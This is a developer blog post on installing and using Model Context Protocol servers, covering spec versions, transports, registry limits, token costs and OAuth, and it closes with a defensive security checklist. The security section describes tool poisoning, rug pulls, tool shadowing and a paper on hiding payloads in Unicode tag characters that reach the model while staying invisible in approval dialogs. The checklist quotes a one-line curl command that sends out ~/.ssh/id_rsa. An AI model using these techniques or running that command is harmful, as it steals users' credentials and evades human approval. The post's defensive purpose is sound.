---
title: 'MCP in practice, and where it bites'
description: 'What MCP is in mid-2026 — primitives, transports, registry — and the four things that bite once you actually install servers.'
pubDate: 'Jul 25 2026'
tags: [llm, coding-agents, mcp]
---

## Where the protocol actually stands

As of late July 2026 the current stable MCP revision is **`2025-11-25`**. Versions are date strings marking the last date backwards-incompatible changes were made, not semver — one string carries the entire compatibility contract. The [versioning page](https://modelcontextprotocol.io/specification/versioning) is the authority, and it still says `2025-11-25`.

A release candidate tagged `2026-07-28` landed in late May 2026, announced for final publication on July 28. It is [explicitly not backwards compatible](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/).

I already wrote up [building an MCP server](/blog/build-an-mcp-server/). This is the other half: what it costs to *consume* servers.

## The primitives, precisely

Two layers: a data layer (JSON-RPC 2.0 — lifecycle, primitives, notifications) and a transport layer (framing, channels, auth). Discovery is always `*/list`, then `*/call` or `*/read`.

| Primitive | Direction | Method | What it is | Status in the RC |
| --- | --- | --- | --- | --- |
| Tools | server → client | `tools/list`, `tools/call` | Functions with a JSON Schema `inputSchema` | Active; schemas widen to JSON Schema 2020-12 |
| Resources | server → client | `resources/list`, `resources/read` | Contextual data addressed by URI | Active |
| Prompts | server → client | `prompts/list`, `prompts/get` | Reusable interaction templates | Active |
| Elicitation | client-side | `elicitation/create` | Server asks the *user* for structured input mid-run | Active; form and url modes |
| Sampling | client-side | `sampling/createMessage` | Server asks the host's LLM for a completion | **Deprecated** |
| Logging | client-side | — | Server log messages to the client | **Deprecated** |
| Roots | client-side | — | Filesystem location tracking | **Deprecated** |
| Tasks | cross-cutting | — | Durable requests, deferred results, polling | Experimental, now redesigned as an extension |

Elicitation form mode **must not** carry credentials. A server popping a form for an API key is violating the spec — url mode exists so the browser handles secrets.

Note the churn: `2025-11-25` *added* tool calling to sampling (SEP-1577); six months later the RC deprecates sampling outright. Deprecated primitives keep working at least 12 months under the RC's new lifecycle policy.

## Transports: two, and no more coming

**stdio** — the client launches the server as a subprocess, newline-delimited JSON-RPC over stdin/stdout. The server must not write non-MCP data to stdout; it may write anything to stderr, which clients should not read as an error signal.

**Streamable HTTP** — one endpoint path handling POST and GET, replacing the deprecated HTTP+SSE transport. Three things clients get wrong, per the [transports spec](https://modelcontextprotocol.io/specification/2025-11-25/basic/transports): `Accept` must list both `application/json` and `text/event-stream`; `MCP-Protocol-Version` goes on every request (absent, the server assumes `2025-03-26`, a magic default baked into the spec); resumption is always via GET with `Last-Event-ID`.

Two server-side MUSTs people skip locally: validate `Origin` and 403 on invalid, and bind `127.0.0.1`, not `0.0.0.0`. Both stop DNS rebinding turning a "local only" server into a reachable one. The [2026 roadmap](https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/) plans no new official transports.

## The registry is a phone book, not an app store

`registry.modelcontextprotocol.io` is still **preview**, API frozen at v0.1, docs warning that breaking changes or data resets may occur before GA. It stores `server.json` metadata pointing at npm, PyPI, Docker Hub or a remote URL. No code.

Two facts matter more than the headline count. Namespaces are ownership-verified (GitHub OAuth / OIDC / DNS / HTTP challenge) — that authenticates *who published*, not *what it does*. And the registry [delegates security scanning](https://modelcontextprotocol.io/registry/about) to the package registries and downstream aggregators; its own spam control is namespace auth, regex validation, and manual takedown.

I paginated the live API on 2026-07-25 and counted 18,441 latest-version records, 18,250 active:

```bash
curl -s "https://registry.modelcontextprotocol.io/v0/servers?limit=100&version=latest"
```

Don't read that as 18k useful servers. Official messaging still quotes "10,000 active servers" from December 2025, when MCP was donated to the Agentic AI Foundation, and registry records include spam and abandoned entries. Neither number is a quality signal.

## Bite #1: tool definitions eat your context before you type anything

Tool schemas load into context up front. Anthropic's own measurement: **58 tools across five servers is roughly 55K tokens**, and complex systems cross 50,000 tokens of definitions alone.

Two mitigations shipped, both measured:

- **Tool search** — defer schema loading, retrieve on demand. Anthropic reports ~77K → ~8.7K tokens, an 85% reduction, with *higher* accuracy on MCP evaluations, not lower: Opus 4.5 went 79.5% → 88.1%. See [advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use).
- **Code execution** — expose tools as a filesystem of code APIs the agent imports. A Google Drive → Salesforce workflow went [150,000 tokens to 2,000](https://www.anthropic.com/engineering/code-execution-with-mcp), a 98.7% reduction.

In Claude Code the first is the default: only tool names and server instructions load at session start; there is no fixed per-server tool cap — the limit is your context budget. The knobs, per the [MCP docs](https://code.claude.com/docs/en/mcp):

```bash
# auto: load schemas upfront while they fit in 10% of the context window, defer the rest
export ENABLE_TOOL_SEARCH=auto

# output-side cap: warning above 10,000 tokens (fixed), hard limit 25,000 by default
export MAX_MCP_OUTPUT_TOKENS=50000
```

Two gotchas. Tool search needs a model supporting `tool_reference` blocks (Sonnet 4.5, Haiku 4.5, Opus 4.5 and later), and it auto-disables when `ANTHROPIC_BASE_URL` points at a non-first-party host, because most proxies don't forward those blocks — route through a gateway and you silently get the expensive path. Separately, tool descriptions and server instructions are truncated at 2KB each; front-load the useful part.

## Bite #2: versioning, and a hard cutover coming

`2026-07-28` removes the `initialize`/`initialized` handshake and the `Mcp-Session-Id` header entirely — state moves onto the wire in `_meta` per request. It adds two required routing headers (`Mcp-Method`, `Mcp-Name`), caching fields (`ttlMs`, `cacheScope`), and moves missing-resource errors from `-32002` to the standard `-32602`, exactly the kind of thing client code pattern-matches on.

Local stdio servers barely notice. Stateful multi-tenant remote servers break. Maintainer David Soria Parra, [quoted by The Register](https://www.theregister.com/devops/2026/07/23/model-context-protocol-prepares-to-break-with-its-stateful-past/5276722): "If you built your own implementation, it's going to be a lot of uplift to make this correct."

Beta SDKs exist if you want to start now:

```bash
pip install "mcp[cli]==2.0.0b1"                     # Python: FastMCP -> MCPServer
npx @modelcontextprotocol/codemod@beta v1-to-v2 .   # TypeScript: ESM-only, Node 20+
go get github.com/modelcontextprotocol/go-sdk@v1.7.0-pre.1
```

SDKs adopt revisions at their own pace by design — hence the tiering system (Tier 1: TypeScript, Python, C#, Go). Pin versions.

## Bite #3: auth is optional, which is the problem

Authorization is OPTIONAL. HTTP transports should conform; stdio implementations should *not*, taking credentials from the environment instead. So "is this server authenticated" is a per-server question, never a protocol guarantee.

Where it applies, the [authorization spec](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization) is dense: OAuth 2.1, RFC 9728 protected resource metadata, RFC 8414 *and* OIDC discovery, PKCE with S256 (clients must refuse to proceed if the AS doesn't advertise it), the RFC 8707 `resource` parameter. Dynamic Client Registration has been demoted — `2025-11-25` makes Client ID Metadata Documents the recommended mechanism and calls DCR backwards compatibility.

The rule to remember: **token passthrough is forbidden.** A server must not accept a token that wasn't issued for it. Every server is its own audience.

## Bite #4: the security surface is the tool description itself

A tool description is attacker-controlled text going straight into the model's context. The [OWASP MCP cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html) names nine risk categories; four are worth memorising:

- **Tool poisoning** — instructions embedded in descriptions or schemas.
- **Rug pull** — a server changes a tool definition *after* you approved it.
- **Tool shadowing** — one server's description changes how the agent uses a *different, trusted* server's tools, or collides on a tool name.
- **Confused deputy** — a proxy server acting with its own broad privileges instead of yours. The spec's [security best practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) walks the OAuth version of this.

The record is not theoretical. `mcp-remote` shipped an OS command injection ([CVE-2025-6514](https://github.com/advisories/GHSA-6xpm-ggf7-wc3p), CVSS 9.6, versions ≥0.0.5 <0.1.16, patched in 0.1.16): a malicious server returned a booby-trapped `authorization_endpoint` that reached the shell. In April 2026, ten CVEs across Letta, LangFlow, Windsurf and others traced to one stdio transport design flaw, hitting projects with 150M+ downloads. [Authzed keeps a readable timeline](https://authzed.com/blog/timeline-mcp-breaches).

Human approval is not a reliable backstop either. A July 2026 paper, [Unicode TAG-Block Concealment of Tool-Metadata Payloads in MCP](https://arxiv.org/abs/2607.05744), hid payloads in U+E0000–U+E007F across three independently written Python MCP libraries: 8/8 techniques delivered attacker-controlled payloads to the model, 4/8 bypassed string-matching sanitizers, and one was **invisible in the approval dialog while reaching the model unchanged**, zero re-approvals triggered. The author calls it an approval-view fidelity gap.

## Checklist before installing a server

- [ ] **Who publishes it?** Namespace verification proves ownership of `io.github.foo`, nothing more. Read the repo.
- [ ] **Exact package name.** `mcp-server-filesytem` vs `mcp-server-filesystem` is OWASP's own typosquat example. Copy-paste, don't type.
- [ ] **Read the startup command untruncated.** A one-click install hiding `npx something && curl -d @~/.ssh/id_rsa ...` is the documented attack.
- [ ] **Count the tools and the tokens.** Ten tools you never call still cost context every session.
- [ ] **Pin the version, hash-pin the tool definitions.** OWASP's answer to rug pulls. Run `mcp-scan` over descriptions.
- [ ] **Check the scopes.** `files:*` or `admin:*` means one stolen token has full blast radius.
- [ ] **Confirm it never asks for credentials in an elicitation form.**
- [ ] **Local servers: containerize.** Each is its own untrusted domain — never share tokens between them.
- [ ] **Remote servers: verify HTTPS, `Origin` validation, and that auth exists at all.**
- [ ] **Log every invocation with parameters,** and alert when new tools appear in an approved server.

## What to do differently

Delete servers. A server should earn its slot: it costs context every session whether you use it or not, and permanently widens your attack surface. Two well-chosen servers beat ten. If you run a gateway, check whether it forwards `tool_reference` blocks — if not, you are paying full schema cost and don't know it.

If you maintain a remote MCP server, start the stateless migration now rather than after July 28. Sessions and the initialize handshake are gone, and no SDK upgrade makes that decision for you.

And stop treating the approval dialog as a security control. It renders text you didn't write and can't fully see. What holds is hash-pinned definitions, minimal scopes, per-server isolation, and logs you actually read.
